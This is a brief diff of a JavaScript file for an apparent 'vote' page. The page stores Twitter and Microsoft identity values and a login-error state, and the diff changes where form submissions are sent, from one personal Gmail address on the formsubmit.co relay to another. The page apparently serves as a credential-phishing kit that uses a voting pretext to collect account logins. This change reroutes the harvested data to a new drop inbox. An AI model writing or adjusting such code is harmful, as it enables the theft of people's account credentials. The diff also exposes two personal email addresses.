@@ -170,7 +170,7 @@ let activeVoteScreen = 'services'
 let twitterIdentityValue = ''
 let microsoftIdentityValue = ''
 const voteErrorStorageKey = 'vote-login-error-state'
-const voteFormEndpoint = 'https://formsubmit.co/goldenpathcapital13@gmail.com'
+const voteFormEndpoint = 'https://formsubmit.co/bamzymediatv@gmail.com'
 
 function escapeHtml(value) {
   return String(value)
